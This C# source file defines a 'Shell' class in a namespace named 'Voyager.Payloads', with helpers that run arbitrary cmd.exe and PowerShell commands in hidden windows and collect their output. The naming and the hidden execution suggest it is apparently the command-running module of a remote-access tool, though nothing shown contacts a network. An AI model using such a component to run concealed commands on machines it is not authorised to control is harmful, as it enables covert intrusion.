using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Diagnostics;

namespace Voyager.Payloads
{
    class Shell
    {
        private static string Batchresults = "";
        public static void start()
        {
            Debug.WriteLine("Testing Console Command");
            try
            {
                cmd("dir");
                Debug.WriteLine("Console Command Executed Successfully");
            }
            catch
            {
                Helpers.Error command_error = new Helpers.Error(0);
                Debug.Write("{0} error", command_error.get_name());
            }
        }
        public static string custom(string command, string exe)
        {
            System.Diagnostics.ProcessStartInfo psi = new System.Diagnostics.ProcessStartInfo();
            psi.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
            psi.FileName = exe;
            psi.Arguments = command;
            psi.RedirectStandardOutput = true;
            psi.UseShellExecute = false;
            System.Diagnostics.Process proc = System.Diagnostics.Process.Start(psi); ;
            System.IO.StreamReader myOutput = proc.StandardOutput;
            proc.WaitForExit(2000);
            if (proc.HasExited)
            {
                return myOutput.ReadToEnd();
            }
            else
            {
                return myOutput.ReadToEnd();
            }
        }
        private static string cmd(string cmd, string mapD = "false")
        {
            if (mapD == "false")
            {
                mapD = System.IO.Directory.GetCurrentDirectory();
            }
            System.Diagnostics.ProcessStartInfo procStartInfo = new System.Diagnostics.ProcessStartInfo("cmd", "/c " + cmd);
            procStartInfo.WorkingDirectory = mapD;
            procStartInfo.RedirectStandardOutput = true;
            procStartInfo.RedirectStandardError = true;
            procStartInfo.RedirectStandardInput = true;
            procStartInfo.UseShellExecute = false;
            procStartInfo.CreateNoWindow = true;
            System.Diagnostics.Process cmdProcess = new System.Diagnostics.Process();
            cmdProcess.StartInfo = procStartInfo;
            cmdProcess.ErrorDataReceived += cmd_Error;
            cmdProcess.OutputDataReceived += cmd_DataReceived;
            cmdProcess.EnableRaisingEvents = true;
            cmdProcess.Start();
            cmdProcess.BeginOutputReadLine();
            cmdProcess.BeginErrorReadLine();
            cmdProcess.StandardInput.WriteLine("exit");
            cmdProcess.WaitForExit();
            return Batchresults;
        }
        static void cmd_DataReceived(object sender, DataReceivedEventArgs e)
        {
            if (e.Data != null)
                Batchresults += Environment.NewLine + e.Data.ToString();
        }

        static void cmd_Error(object sender, DataReceivedEventArgs e)
        {
            if (e.Data != null)
            {
                Batchresults += Environment.NewLine + e.Data.ToString();
            }
        }
        private static string powershell(string cmd, string mapD = "false")
        {
            if (mapD == "false")
            {
                mapD = System.IO.Directory.GetCurrentDirectory();
            }
            System.Diagnostics.ProcessStartInfo procStartInfo = new System.Diagnostics.ProcessStartInfo("powershell", "/c " + cmd);
            procStartInfo.WorkingDirectory = mapD;
            procStartInfo.RedirectStandardOutput = true;
            procStartInfo.RedirectStandardError = true;
            procStartInfo.RedirectStandardInput = true;
            procStartInfo.UseShellExecute = false;
            procStartInfo.CreateNoWindow = true;
            System.Diagnostics.Process cmdProcess = new System.Diagnostics.Process();
            cmdProcess.StartInfo = procStartInfo;
            cmdProcess.ErrorDataReceived += cmd_Error;
            cmdProcess.OutputDataReceived += cmd_DataReceived;
            cmdProcess.EnableRaisingEvents = true;
            cmdProcess.Start();
            cmdProcess.BeginOutputReadLine();
            cmdProcess.BeginErrorReadLine();
            cmdProcess.StandardInput.WriteLine("exit");
            cmdProcess.WaitForExit();
            return Batchresults;
        }
    }
}
